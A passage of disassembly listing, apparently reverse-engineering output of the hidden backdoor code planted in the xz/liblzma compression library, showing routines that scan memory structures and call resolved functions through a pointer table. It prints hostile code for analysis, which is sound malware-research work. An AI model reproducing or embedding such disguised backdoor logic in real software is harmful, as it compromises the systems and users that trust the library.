.text.lzma_index_dua:0000000000007842                 jz      loc_7933
.text.lzma_index_dua:0000000000007848                 mov     dword ptr [rsp+0F8h+var_C1], 20000000h
.text.lzma_index_dua:0000000000007850                 xor     eax, eax
.text.lzma_index_dua:0000000000007852                 lea     rdi, [rsp+0F8h+var_C1]
.text.lzma_index_dua:0000000000007857                 lea     rcx, [rsp+0F8h+var_C1+4]
.text.lzma_index_dua:000000000000785C
.text.lzma_index_dua:000000000000785C loc_785C:                               ; CODE XREF: sub_7660+20B↓j
.text.lzma_index_dua:000000000000785C                 mov     sil, [rdx+rax]
.text.lzma_index_dua:0000000000007860                 mov     [rcx+rax], sil
.text.lzma_index_dua:0000000000007864                 inc     rax
.text.lzma_index_dua:0000000000007867                 cmp     rax, 20h ; ' '
.text.lzma_index_dua:000000000000786B                 jnz     short loc_785C
.text.lzma_index_dua:000000000000786D                 mov     rcx, r14
.text.lzma_index_dua:0000000000007870                 lea     rdx, [rbp+rbx+0]
.text.lzma_index_dua:0000000000007875                 mov     r8, r12
.text.lzma_index_dua:0000000000007878                 mov     esi, 24h ; '$'
.text.lzma_index_dua:000000000000787D                 sub     rcx, rbx
.text.lzma_index_dua:0000000000007880
.text.lzma_index_dua:0000000000007880 loc_7880:                               ; CODE XREF: sub_7660+1C3↑j
.text.lzma_index_dua:0000000000007880                 call    sub_72E0
.text.lzma_index_dua:0000000000007885                 jmp     loc_7728
.text.lzma_index_dua:000000000000788A ; ---------------------------------------------------------------------------
.text.lzma_index_dua:000000000000788A
.text.lzma_index_dua:000000000000788A loc_788A:                               ; CODE XREF: sub_7660+D7↑j
.text.lzma_index_dua:000000000000788A                 lea     rdi, [rbx+70h]
.text.lzma_index_dua:000000000000788E                 mov     esi, 6
.text.lzma_index_dua:0000000000007893                 call    sub_71A0
.text.lzma_index_dua:0000000000007898                 test    eax, eax
.text.lzma_index_dua:000000000000789A                 jnz     loc_7933
.text.lzma_index_dua:00000000000078A0                 cmp     [rsp+0F8h+var_F0], 0
.text.lzma_index_dua:00000000000078A6                 jz      loc_7933
.text.lzma_index_dua:00000000000078AC                 mov     rdx, [rsp+0F8h+var_F0]
.text.lzma_index_dua:00000000000078B1                 mov     ecx, 39h ; '9'
.text.lzma_index_dua:00000000000078B6                 xor     esi, esi
.text.lzma_index_dua:00000000000078B8                 mov     edi, 440h
.text.lzma_index_dua:00000000000078BD                 call    qword ptr [rbx+70h]
.text.lzma_index_dua:00000000000078C0                 mov     r13, rax
.text.lzma_index_dua:00000000000078C3                 test    rax, rax
.text.lzma_index_dua:00000000000078C6                 jz      short loc_7933
.text.lzma_index_dua:00000000000078C8                 call    qword ptr [rbx+78h]
.text.lzma_index_dua:00000000000078CB                 mov     r12, rax
.text.lzma_index_dua:00000000000078CE                 test    rax, rax
.text.lzma_index_dua:00000000000078D1                 jz      short loc_792A
.text.lzma_index_dua:00000000000078D3                 xor     ecx, ecx
.text.lzma_index_dua:00000000000078D5                 xor     edx, edx
.text.lzma_index_dua:00000000000078D7                 xor     esi, esi
.text.lzma_index_dua:00000000000078D9                 mov     r8, r13
.text.lzma_index_dua:00000000000078DC                 mov     rdi, rax
.text.lzma_index_dua:00000000000078DF                 call    qword ptr [rbx+80h]
.text.lzma_index_dua:00000000000078E5                 dec     eax
.text.lzma_index_dua:00000000000078E7                 jnz     short loc_7921
.text.lzma_index_dua:00000000000078E9                 mov     rsi, [rsp+0F8h+var_E8]
.text.lzma_index_dua:00000000000078EE                 mov     r8, r15
.text.lzma_index_dua:00000000000078F1                 mov     rcx, rbp
.text.lzma_index_dua:00000000000078F4                 mov     edx, 72h ; 'r'
.text.lzma_index_dua:00000000000078F9                 mov     rdi, r12
.text.lzma_index_dua:00000000000078FC                 call    qword ptr [rbx+88h]
.text.lzma_index_dua:0000000000007902                 cmp     eax, 1
.text.lzma_index_dua:0000000000007905                 mov     dword ptr [rsp+0F8h+var_F8], eax
.text.lzma_index_dua:0000000000007908                 jnz     short loc_7921
.text.lzma_index_dua:000000000000790A                 mov     rdi, r12
.text.lzma_index_dua:000000000000790D                 call    qword ptr [rbx+90h]
.text.lzma_index_dua:0000000000007913                 mov     rdi, r13
.text.lzma_index_dua:0000000000007916                 call    qword ptr [rbx+98h]
.text.lzma_index_dua:000000000000791C                 mov     eax, dword ptr [rsp+0F8h+var_F8]
.text.lzma_index_dua:000000000000791F                 jmp     short loc_7935
.text.lzma_index_dua:0000000000007921 ; ---------------------------------------------------------------------------
.text.lzma_index_dua:0000000000007921
.text.lzma_index_dua:0000000000007921 loc_7921:                               ; CODE XREF: sub_7660+287↑j
.text.lzma_index_dua:0000000000007921                                         ; sub_7660+2A8↑j
.text.lzma_index_dua:0000000000007921                 mov     rdi, r12
.text.lzma_index_dua:0000000000007924                 call    qword ptr [rbx+90h]
.text.lzma_index_dua:000000000000792A
.text.lzma_index_dua:000000000000792A loc_792A:                               ; CODE XREF: sub_7660+271↑j
.text.lzma_index_dua:000000000000792A                 mov     rdi, r13
.text.lzma_index_dua:000000000000792D                 call    qword ptr [rbx+98h]
.text.lzma_index_dua:0000000000007933
.text.lzma_index_dua:0000000000007933 loc_7933:                               ; CODE XREF: sub_7660+26↑j
.text.lzma_index_dua:0000000000007933                                         ; sub_7660+32↑j ...
.text.lzma_index_dua:0000000000007933                 xor     eax, eax
.text.lzma_index_dua:0000000000007935
.text.lzma_index_dua:0000000000007935 loc_7935:                               ; CODE XREF: sub_7660+2BF↑j
.text.lzma_index_dua:0000000000007935                 add     rsp, 0C8h
.text.lzma_index_dua:000000000000793C                 pop     rbx
.text.lzma_index_dua:000000000000793D                 pop     rbp
.text.lzma_index_dua:000000000000793E                 pop     r12
.text.lzma_index_dua:0000000000007940                 pop     r13
.text.lzma_index_dua:0000000000007942                 pop     r14
.text.lzma_index_dua:0000000000007944                 pop     r15
.text.lzma_index_dua:0000000000007946                 retn
.text.lzma_index_dua:0000000000007946 sub_7660        endp
.text.lzma_index_dua:0000000000007946
.text.lzma_index_dua:0000000000007946 _text_lzma_index_dua ends
.text.lzma_index_dua:0000000000007946
.text.length_encoder_resez:0000000000007950 ; ===========================================================================
.text.length_encoder_resez:0000000000007950
.text.length_encoder_resez:0000000000007950 ; Segment type: Pure code
.text.length_encoder_resez:0000000000007950 ; Segment permissions: Read/Execute
.text.length_encoder_resez:0000000000007950 _text_length_encoder_resez segment para public 'CODE' use64
.text.length_encoder_resez:0000000000007950                 assume cs:_text_length_encoder_resez
.text.length_encoder_resez:0000000000007950                 ;org 7950h
.text.length_encoder_resez:0000000000007950                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.length_encoder_resez:0000000000007950
.text.length_encoder_resez:0000000000007950 ; =============== S U B R O U T I N E =======================================
.text.length_encoder_resez:0000000000007950
.text.length_encoder_resez:0000000000007950
.text.length_encoder_resez:0000000000007950 ; __int64 __fastcall Llength_encoder_reset_0(_QWORD *)
.text.length_encoder_resez:0000000000007950 _Llength_encoder_reset_0 proc near      ; CODE XREF: _Lthreads_stop_0+FF↓p
.text.length_encoder_resez:0000000000007950                                         ; _Lthreads_stop_0+154↓p
.text.length_encoder_resez:0000000000007950                 endbr64
.text.length_encoder_resez:0000000000007954                 mov     rdx, [rdi+18h]
.text.length_encoder_resez:0000000000007958                 xor     eax, eax
.text.length_encoder_resez:000000000000795A                 lea     rcx, [rdx-20h]
.text.length_encoder_resez:000000000000795E                 cmp     rcx, 20h ; ' '
.text.length_encoder_resez:0000000000007962                 ja      short locret_797F
.text.length_encoder_resez:0000000000007964                 mov     rcx, [rdi]
.text.length_encoder_resez:0000000000007967                 xor     eax, eax
.text.length_encoder_resez:0000000000007969
.text.length_encoder_resez:0000000000007969 loc_7969:                               ; CODE XREF: _Llength_encoder_reset_0+25↓j
.text.length_encoder_resez:0000000000007969                 cmp     byte ptr [rcx+rax], 0
.text.length_encoder_resez:000000000000796D                 js      short loc_797A
.text.length_encoder_resez:000000000000796F                 inc     rax
.text.length_encoder_resez:0000000000007972                 cmp     rdx, rax
.text.length_encoder_resez:0000000000007975                 jnz     short loc_7969
.text.length_encoder_resez:0000000000007977                 xor     eax, eax
.text.length_encoder_resez:0000000000007979                 retn
.text.length_encoder_resez:000000000000797A ; ---------------------------------------------------------------------------
.text.length_encoder_resez:000000000000797A
.text.length_encoder_resez:000000000000797A loc_797A:                               ; CODE XREF: _Llength_encoder_reset_0+1D↑j
.text.length_encoder_resez:000000000000797A                 mov     eax, 1
.text.length_encoder_resez:000000000000797F
.text.length_encoder_resez:000000000000797F locret_797F:                            ; CODE XREF: _Llength_encoder_reset_0+12↑j
.text.length_encoder_resez:000000000000797F                 retn
.text.length_encoder_resez:000000000000797F _Llength_encoder_reset_0 endp
.text.length_encoder_resez:000000000000797F
.text.length_encoder_resez:000000000000797F _text_length_encoder_resez ends
.text.length_encoder_resez:000000000000797F
.text.stream_decoder_mt_get_progresz:0000000000007980 ; ===========================================================================
.text.stream_decoder_mt_get_progresz:0000000000007980
.text.stream_decoder_mt_get_progresz:0000000000007980 ; Segment type: Pure code
.text.stream_decoder_mt_get_progresz:0000000000007980 ; Segment permissions: Read/Execute
.text.stream_decoder_mt_get_progresz:0000000000007980 _text_stream_decoder_mt_get_progresz segment para public 'CODE' use64
.text.stream_decoder_mt_get_progresz:0000000000007980                 assume cs:_text_stream_decoder_mt_get_progresz
.text.stream_decoder_mt_get_progresz:0000000000007980                 ;org 7980h
.text.stream_decoder_mt_get_progresz:0000000000007980                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_decoder_mt_get_progresz:0000000000007980
.text.stream_decoder_mt_get_progresz:0000000000007980 ; =============== S U B R O U T I N E =======================================
.text.stream_decoder_mt_get_progresz:0000000000007980
.text.stream_decoder_mt_get_progresz:0000000000007980
.text.stream_decoder_mt_get_progresz:0000000000007980 ; _BOOL8 __fastcall Lstream_decoder_mt_get_progress_0(unsigned __int64 *, __int64, unsigned __int64 *, __int64 *)
.text.stream_decoder_mt_get_progresz:0000000000007980 _Lstream_decoder_mt_get_progress_0 proc near
.text.stream_decoder_mt_get_progresz:0000000000007980                                         ; CODE XREF: _Lthreads_stop_0+EF↓p
.text.stream_decoder_mt_get_progresz:0000000000007980                                         ; _Lthreads_stop_0+142↓p ...
.text.stream_decoder_mt_get_progresz:0000000000007980                 endbr64
.text.stream_decoder_mt_get_progresz:0000000000007984                 test    rsi, rsi
.text.stream_decoder_mt_get_progresz:0000000000007987                 jz      loc_7A43
.text.stream_decoder_mt_get_progresz:000000000000798D                 push    r15
.text.stream_decoder_mt_get_progresz:000000000000798F                 push    r14
.text.stream_decoder_mt_get_progresz:0000000000007991                 push    r13
.text.stream_decoder_mt_get_progresz:0000000000007993                 mov     r13, rdi
.text.stream_decoder_mt_get_progresz:0000000000007996                 push    r12
.text.stream_decoder_mt_get_progresz:0000000000007998                 push    rbp
.text.stream_decoder_mt_get_progresz:0000000000007999                 push    rbx
.text.stream_decoder_mt_get_progresz:000000000000799A                 push    r8
.text.stream_decoder_mt_get_progresz:000000000000799C                 test    rdi, rdi
.text.stream_decoder_mt_get_progresz:000000000000799F                 jnz     short loc_79A8
.text.stream_decoder_mt_get_progresz:00000000000079A1
.text.stream_decoder_mt_get_progresz:00000000000079A1 loc_79A1:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+2E↓j
.text.stream_decoder_mt_get_progresz:00000000000079A1                                         ; _Lstream_decoder_mt_get_progress_0+36↓j ...
.text.stream_decoder_mt_get_progresz:00000000000079A1                 xor     eax, eax
.text.stream_decoder_mt_get_progresz:00000000000079A3                 jmp     loc_7A37
.text.stream_decoder_mt_get_progresz:00000000000079A8 ; ---------------------------------------------------------------------------
.text.stream_decoder_mt_get_progresz:00000000000079A8
.text.stream_decoder_mt_get_progresz:00000000000079A8 loc_79A8:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+1F↑j
.text.stream_decoder_mt_get_progresz:00000000000079A8                 mov     r14, rdx
.text.stream_decoder_mt_get_progresz:00000000000079AB                 test    rdx, rdx
.text.stream_decoder_mt_get_progresz:00000000000079AE                 jz      short loc_79A1
.text.stream_decoder_mt_get_progresz:00000000000079B0                 mov     r15, rcx
.text.stream_decoder_mt_get_progresz:00000000000079B3                 test    rcx, rcx
.text.stream_decoder_mt_get_progresz:00000000000079B6                 jz      short loc_79A1
.text.stream_decoder_mt_get_progresz:00000000000079B8                 movsx   ebx, byte ptr [rsi+57h]
.text.stream_decoder_mt_get_progresz:00000000000079BC                 movsx   ebp, byte ptr [rsi+56h]
.text.stream_decoder_mt_get_progresz:00000000000079C0                 mov     r12, rsi
.text.stream_decoder_mt_get_progresz:00000000000079C3                 test    bl, bpl
.text.stream_decoder_mt_get_progresz:00000000000079C6                 js      short loc_79E3
.text.stream_decoder_mt_get_progresz:00000000000079C8                 shl     ebp, 3
.text.stream_decoder_mt_get_progresz:00000000000079CB                 shl     ebx, 3
.text.stream_decoder_mt_get_progresz:00000000000079CE                 movsxd  rbx, ebx
.text.stream_decoder_mt_get_progresz:00000000000079D1                 movsxd  rbp, ebp
.text.stream_decoder_mt_get_progresz:00000000000079D4                 lea     rsi, [rbx+8]
.text.stream_decoder_mt_get_progresz:00000000000079D8                 cmp     rbx, rbp
.text.stream_decoder_mt_get_progresz:00000000000079DB                 jnb     short loc_79EC
.text.stream_decoder_mt_get_progresz:00000000000079DD                 lea     rsi, [rbp+8]
.text.stream_decoder_mt_get_progresz:00000000000079E1                 jmp     short loc_79EC
.text.stream_decoder_mt_get_progresz:00000000000079E3 ; ---------------------------------------------------------------------------
.text.stream_decoder_mt_get_progresz:00000000000079E3
.text.stream_decoder_mt_get_progresz:00000000000079E3 loc_79E3:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+46↑j
.text.stream_decoder_mt_get_progresz:00000000000079E3                 xor     ebx, ebx
.text.stream_decoder_mt_get_progresz:00000000000079E5                 xor     ebp, ebp
.text.stream_decoder_mt_get_progresz:00000000000079E7                 mov     esi, 48h ; 'H'
.text.stream_decoder_mt_get_progresz:00000000000079EC
.text.stream_decoder_mt_get_progresz:00000000000079EC loc_79EC:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+5B↑j
.text.stream_decoder_mt_get_progresz:00000000000079EC                                         ; _Lstream_decoder_mt_get_progress_0+61↑j
.text.stream_decoder_mt_get_progresz:00000000000079EC                 mov     rdx, r12
.text.stream_decoder_mt_get_progresz:00000000000079EF                 mov     rdi, r13
.text.stream_decoder_mt_get_progresz:00000000000079F2                 call    _Lhc_find_func_1 ; PIC mode
.text.stream_decoder_mt_get_progresz:00000000000079F7                 test    eax, eax
.text.stream_decoder_mt_get_progresz:00000000000079F9                 jz      short loc_79A1
.text.stream_decoder_mt_get_progresz:00000000000079FB                 cmp     byte ptr [r12+56h], 0
.text.stream_decoder_mt_get_progresz:0000000000007A01                 js      short loc_7A0A
.text.stream_decoder_mt_get_progresz:0000000000007A03                 mov     rdi, [rbp+r13+0]
.text.stream_decoder_mt_get_progresz:0000000000007A08                 jmp     short loc_7A0E
.text.stream_decoder_mt_get_progresz:0000000000007A0A ; ---------------------------------------------------------------------------
.text.stream_decoder_mt_get_progresz:0000000000007A0A
.text.stream_decoder_mt_get_progresz:0000000000007A0A loc_7A0A:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+81↑j
.text.stream_decoder_mt_get_progresz:0000000000007A0A                 mov     rdi, [r13+0]
.text.stream_decoder_mt_get_progresz:0000000000007A0E
.text.stream_decoder_mt_get_progresz:0000000000007A0E loc_7A0E:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+88↑j
.text.stream_decoder_mt_get_progresz:0000000000007A0E                 mov     [r14], rdi
.text.stream_decoder_mt_get_progresz:0000000000007A11                 cmp     byte ptr [r12+57h], 0
.text.stream_decoder_mt_get_progresz:0000000000007A17                 js      short loc_7A20
.text.stream_decoder_mt_get_progresz:0000000000007A19                 mov     rsi, [r13+rbx+0]
.text.stream_decoder_mt_get_progresz:0000000000007A1E                 jmp     short loc_7A24
.text.stream_decoder_mt_get_progresz:0000000000007A20 ; ---------------------------------------------------------------------------
.text.stream_decoder_mt_get_progresz:0000000000007A20
.text.stream_decoder_mt_get_progresz:0000000000007A20 loc_7A20:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+97↑j
.text.stream_decoder_mt_get_progresz:0000000000007A20                 mov     rsi, [r13+18h]
.text.stream_decoder_mt_get_progresz:0000000000007A24
.text.stream_decoder_mt_get_progresz:0000000000007A24 loc_7A24:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+9E↑j
.text.stream_decoder_mt_get_progresz:0000000000007A24                 mov     [r15], rsi
.text.stream_decoder_mt_get_progresz:0000000000007A27                 mov     rdx, r12
.text.stream_decoder_mt_get_progresz:0000000000007A2A                 call    _Lhc_find_func_1 ; PIC mode
.text.stream_decoder_mt_get_progresz:0000000000007A2F                 test    eax, eax
.text.stream_decoder_mt_get_progresz:0000000000007A31                 setnz   al
.text.stream_decoder_mt_get_progresz:0000000000007A34                 movzx   eax, al
.text.stream_decoder_mt_get_progresz:0000000000007A37
.text.stream_decoder_mt_get_progresz:0000000000007A37 loc_7A37:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+23↑j
.text.stream_decoder_mt_get_progresz:0000000000007A37                 pop     rdx
.text.stream_decoder_mt_get_progresz:0000000000007A38                 pop     rbx
.text.stream_decoder_mt_get_progresz:0000000000007A39                 pop     rbp
.text.stream_decoder_mt_get_progresz:0000000000007A3A                 pop     r12
.text.stream_decoder_mt_get_progresz:0000000000007A3C                 pop     r13
.text.stream_decoder_mt_get_progresz:0000000000007A3E                 pop     r14
.text.stream_decoder_mt_get_progresz:0000000000007A40                 pop     r15
.text.stream_decoder_mt_get_progresz:0000000000007A42                 retn
.text.stream_decoder_mt_get_progresz:0000000000007A43 ; ---------------------------------------------------------------------------
.text.stream_decoder_mt_get_progresz:0000000000007A43
.text.stream_decoder_mt_get_progresz:0000000000007A43 loc_7A43:                               ; CODE XREF: _Lstream_decoder_mt_get_progress_0+7↑j
.text.stream_decoder_mt_get_progresz:0000000000007A43                 xor     eax, eax
.text.stream_decoder_mt_get_progresz:0000000000007A45                 retn
.text.stream_decoder_mt_get_progresz:0000000000007A45 _Lstream_decoder_mt_get_progress_0 endp
.text.stream_decoder_mt_get_progresz:0000000000007A45
.text.stream_decoder_mt_get_progresz:0000000000007A45 _text_stream_decoder_mt_get_progresz ends
.text.stream_decoder_mt_get_progresz:0000000000007A45
.text.threads_stoz:0000000000007A50 ; ===========================================================================
.text.threads_stoz:0000000000007A50
.text.threads_stoz:0000000000007A50 ; Segment type: Pure code
.text.threads_stoz:0000000000007A50 ; Segment permissions: Read/Execute
.text.threads_stoz:0000000000007A50 _text_threads_stoz segment para public 'CODE' use64
.text.threads_stoz:0000000000007A50                 assume cs:_text_threads_stoz
.text.threads_stoz:0000000000007A50                 ;org 7A50h
.text.threads_stoz:0000000000007A50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.threads_stoz:0000000000007A50
.text.threads_stoz:0000000000007A50 ; =============== S U B R O U T I N E =======================================
.text.threads_stoz:0000000000007A50
.text.threads_stoz:0000000000007A50
.text.threads_stoz:0000000000007A50 ; _BOOL8 __fastcall Lthreads_stop_0(__int64, __int64)
.text.threads_stoz:0000000000007A50 _Lthreads_stop_0 proc near              ; CODE XREF: installed_func_0+6D3↓p
.text.threads_stoz:0000000000007A50                 endbr64
.text.threads_stoz:0000000000007A54                 test    rdi, rdi
.text.threads_stoz:0000000000007A57                 jz      loc_7BE4
.text.threads_stoz:0000000000007A5D                 push    r15
.text.threads_stoz:0000000000007A5F                 push    r14
.text.threads_stoz:0000000000007A61                 push    r13
.text.threads_stoz:0000000000007A63                 push    r12
.text.threads_stoz:0000000000007A65                 push    rbp
.text.threads_stoz:0000000000007A66                 push    rbx
.text.threads_stoz:0000000000007A67                 mov     rbx, rsi
.text.threads_stoz:0000000000007A6A                 push    rcx
.text.threads_stoz:0000000000007A6B                 test    rsi, rsi
.text.threads_stoz:0000000000007A6E                 jnz     short loc_7A77
.text.threads_stoz:0000000000007A70
.text.threads_stoz:0000000000007A70 loc_7A70:                               ; CODE XREF: _Lthreads_stop_0+31↓j
.text.threads_stoz:0000000000007A70                                         ; _Lthreads_stop_0+42↓j ...
.text.threads_stoz:0000000000007A70                 xor     eax, eax
.text.threads_stoz:0000000000007A72                 jmp     loc_7BD8
.text.threads_stoz:0000000000007A77 ; ---------------------------------------------------------------------------
.text.threads_stoz:0000000000007A77
.text.threads_stoz:0000000000007A77 loc_7A77:                               ; CODE XREF: _Lthreads_stop_0+1E↑j
.text.threads_stoz:0000000000007A77                 mov     rbp, rdi
.text.threads_stoz:0000000000007A7A                 mov     rdi, [rsi+48h]
.text.threads_stoz:0000000000007A7E                 test    rdi, rdi
.text.threads_stoz:0000000000007A81                 jz      short loc_7A70
.text.threads_stoz:0000000000007A83                 mov     rdx, rsi
.text.threads_stoz:0000000000007A86                 mov     esi, 8
.text.threads_stoz:0000000000007A8B                 call    _Lhc_find_func_1 ; PIC mode
.text.threads_stoz:0000000000007A90                 test    eax, eax
.text.threads_stoz:0000000000007A92                 jz      short loc_7A70
.text.threads_stoz:0000000000007A94                 mov     rax, [rbx+48h]
.text.threads_stoz:0000000000007A98                 mov     rdx, rbx
.text.threads_stoz:0000000000007A9B                 mov     esi, 20h ; ' '
.text.threads_stoz:0000000000007AA0                 mov     r13, [rax]
.text.threads_stoz:0000000000007AA3                 mov     rdi, r13
.text.threads_stoz:0000000000007AA6                 call    _Lhc_find_func_1 ; PIC mode
.text.threads_stoz:0000000000007AAB                 test    eax, eax
.text.threads_stoz:0000000000007AAD                 jz      short loc_7A70
.text.threads_stoz:0000000000007AAF                 movsx   eax, byte ptr [rbx+55h]
.text.threads_stoz:0000000000007AB3                 mov     r12, [r13+10h]
.text.threads_stoz:0000000000007AB7                 test    al, al
.text.threads_stoz:0000000000007AB9                 js      short loc_7AC5
.text.threads_stoz:0000000000007ABB                 shl     eax, 2
.text.threads_stoz:0000000000007ABE                 cdqe
.text.threads_stoz:0000000000007AC0                 mov     r12, [r13+rax+0]
.text.threads_stoz:0000000000007AC5
.text.threads_stoz:0000000000007AC5 loc_7AC5:                               ; CODE XREF: _Lthreads_stop_0+69↑j
.text.threads_stoz:0000000000007AC5                 movsx   edx, byte ptr [rbx+57h]
.text.threads_stoz:0000000000007AC9                 movsx   eax, byte ptr [rbx+56h]
.text.threads_stoz:0000000000007ACD                 mov     r13d, 48h ; 'H'
.text.threads_stoz:0000000000007AD3                 test    al, dl
.text.threads_stoz:0000000000007AD5                 js      short loc_7AEF
.text.threads_stoz:0000000000007AD7                 shl     eax, 3
.text.threads_stoz:0000000000007ADA                 shl     edx, 3
.text.threads_stoz:0000000000007ADD                 movsxd  rdx, edx
.text.threads_stoz:0000000000007AE0                 cdqe
.text.threads_stoz:0000000000007AE2                 lea     r13, [rdx+8]
.text.threads_stoz:0000000000007AE6                 cmp     rdx, rax
.text.threads_stoz:0000000000007AE9                 jnb     short loc_7AEF
.text.threads_stoz:0000000000007AEB                 lea     r13, [rax+8]
.text.threads_stoz:0000000000007AEF
.text.threads_stoz:0000000000007AEF loc_7AEF:                               ; CODE XREF: _Lthreads_stop_0+85↑j
.text.threads_stoz:0000000000007AEF                                         ; _Lthreads_stop_0+99↑j
.text.threads_stoz:0000000000007AEF                 mov     rdx, rbx
.text.threads_stoz:0000000000007AF2                 mov     esi, 8
.text.threads_stoz:0000000000007AF7                 mov     rdi, r12
.text.threads_stoz:0000000000007AFA                 call    _Lhc_find_func_1 ; PIC mode
.text.threads_stoz:0000000000007AFF                 test    eax, eax
.text.threads_stoz:0000000000007B01                 jz      loc_7A70
.text.threads_stoz:0000000000007B07                 mov     rdi, [r12]
.text.threads_stoz:0000000000007B0B                 mov     rdx, rbx
.text.threads_stoz:0000000000007B0E                 mov     esi, 400h
.text.threads_stoz:0000000000007B13                 call    _Lhc_find_func_1 ; PIC mode
.text.threads_stoz:0000000000007B18                 test    eax, eax
.text.threads_stoz:0000000000007B1A                 jz      loc_7A70
.text.threads_stoz:0000000000007B20                 movsx   eax, byte ptr [rbx+54h]
.text.threads_stoz:0000000000007B24                 mov     r12, [r12]
.text.threads_stoz:0000000000007B28                 test    al, al
.text.threads_stoz:0000000000007B2A                 js      short loc_7B5E
.text.threads_stoz:0000000000007B2C                 shl     eax, 3
.text.threads_stoz:0000000000007B2F                 lea     rcx, [rbp+18h]
.text.threads_stoz:0000000000007B33                 mov     rdx, rbp
.text.threads_stoz:0000000000007B36                 mov     rsi, rbx
.text.threads_stoz:0000000000007B39                 cdqe
.text.threads_stoz:0000000000007B3B                 mov     rdi, [rax+r12]
.text.threads_stoz:0000000000007B3F                 call    _Lstream_decoder_mt_get_progress_0 ; PIC mode
.text.threads_stoz:0000000000007B44                 test    eax, eax
.text.threads_stoz:0000000000007B46                 jz      loc_7A70
.text.threads_stoz:0000000000007B4C                 mov     rdi, rbp
.text.threads_stoz:0000000000007B4F                 call    _Llength_encoder_reset_0 ; PIC mode
.text.threads_stoz:0000000000007B54                 test    eax, eax
.text.threads_stoz:0000000000007B56                 setnz   al
.text.threads_stoz:0000000000007B59                 movzx   eax, al
.text.threads_stoz:0000000000007B5C                 jmp     short loc_7BD8
.text.threads_stoz:0000000000007B5E ; ---------------------------------------------------------------------------
.text.threads_stoz:0000000000007B5E
.text.threads_stoz:0000000000007B5E loc_7B5E:                               ; CODE XREF: _Lthreads_stop_0+DA↑j
.text.threads_stoz:0000000000007B5E                 xor     r14d, r14d
.text.threads_stoz:0000000000007B61                 lea     r15, [r12+400h]
.text.threads_stoz:0000000000007B69
.text.threads_stoz:0000000000007B69 loc_7B69:                               ; CODE XREF: _Lthreads_stop_0+186↓j
.text.threads_stoz:0000000000007B69                 cmp     r12, r15
.text.threads_stoz:0000000000007B6C                 jnb     loc_7A70
.text.threads_stoz:0000000000007B72                 mov     rdx, rbx
.text.threads_stoz:0000000000007B75                 mov     rsi, r13
.text.threads_stoz:0000000000007B78                 mov     rdi, r12
.text.threads_stoz:0000000000007B7B                 call    _Lhc_find_func_1 ; PIC mode
.text.threads_stoz:0000000000007B80                 test    eax, eax
.text.threads_stoz:0000000000007B82                 jz      short loc_7BD2
.text.threads_stoz:0000000000007B84                 mov     rdi, [r12]
.text.threads_stoz:0000000000007B88                 lea     rcx, [rbp+18h]
.text.threads_stoz:0000000000007B8C                 mov     rdx, rbp
.text.threads_stoz:0000000000007B8F                 mov     rsi, rbx
.text.threads_stoz:0000000000007B92                 call    _Lstream_decoder_mt_get_progress_0 ; PIC mode
.text.threads_stoz:0000000000007B97                 test    eax, eax
.text.threads_stoz:0000000000007B99                 jz      short loc_7BD2
.text.threads_stoz:0000000000007B9B                 cmp     r14d, 1
.text.threads_stoz:0000000000007B9F                 jbe     short loc_7BB4
.text.threads_stoz:0000000000007BA1                 mov     rdi, rbp
.text.threads_stoz:0000000000007BA4                 call    _Llength_encoder_reset_0 ; PIC mode
.text.threads_stoz:0000000000007BA9                 test    eax, eax
.text.threads_stoz:0000000000007BAB                 jz      short loc_7BD2
.text.threads_stoz:0000000000007BAD                 mov     eax, 1
.text.threads_stoz:0000000000007BB2                 jmp     short loc_7BD8
.text.threads_stoz:0000000000007BB4 ; ---------------------------------------------------------------------------
.text.threads_stoz:0000000000007BB4
.text.threads_stoz:0000000000007BB4 loc_7BB4:                               ; CODE XREF: _Lthreads_stop_0+14F↑j
.text.threads_stoz:0000000000007BB4                 mov     rdi, [rbp+0]    ; _BYTE *
.text.threads_stoz:0000000000007BB8                 lea     rsi, [rdi+7]    ; unsigned __int64
.text.threads_stoz:0000000000007BBC                 call    table_get       ; PIC mode
.text.threads_stoz:0000000000007BC1                 cmp     eax, 990h
.text.threads_stoz:0000000000007BC6                 jz      short loc_7BCF
.text.threads_stoz:0000000000007BC8                 cmp     eax, 0D08h
.text.threads_stoz:0000000000007BCD                 jnz     short loc_7BD2
.text.threads_stoz:0000000000007BCF
.text.threads_stoz:0000000000007BCF loc_7BCF:                               ; CODE XREF: _Lthreads_stop_0+176↑j
.text.threads_stoz:0000000000007BCF                 inc     r14d
.text.threads_stoz:0000000000007BD2
.text.threads_stoz:0000000000007BD2 loc_7BD2:                               ; CODE XREF: _Lthreads_stop_0+132↑j
.text.threads_stoz:0000000000007BD2                                         ; _Lthreads_stop_0+149↑j ...
.text.threads_stoz:0000000000007BD2                 add     r12, 8
.text.threads_stoz:0000000000007BD6                 jmp     short loc_7B69
.text.threads_stoz:0000000000007BD8 ; ---------------------------------------------------------------------------
.text.threads_stoz:0000000000007BD8
.text.threads_stoz:0000000000007BD8 loc_7BD8:                               ; CODE XREF: _Lthreads_stop_0+22↑j
.text.threads_stoz:0000000000007BD8                                         ; _Lthreads_stop_0+10C↑j ...
.text.threads_stoz:0000000000007BD8                 pop     rdx
.text.threads_stoz:0000000000007BD9                 pop     rbx
.text.threads_stoz:0000000000007BDA                 pop     rbp
.text.threads_stoz:0000000000007BDB                 pop     r12
.text.threads_stoz:0000000000007BDD                 pop     r13
.text.threads_stoz:0000000000007BDF                 pop     r14
.text.threads_stoz:0000000000007BE1                 pop     r15
.text.threads_stoz:0000000000007BE3                 retn
.text.threads_stoz:0000000000007BE4 ; ---------------------------------------------------------------------------
.text.threads_stoz:0000000000007BE4
.text.threads_stoz:0000000000007BE4 loc_7BE4:                               ; CODE XREF: _Lthreads_stop_0+7↑j
.text.threads_stoz:0000000000007BE4                 xor     eax, eax
.text.threads_stoz:0000000000007BE6                 retn
.text.threads_stoz:0000000000007BE6 _Lthreads_stop_0 endp
.text.threads_stoz:0000000000007BE6
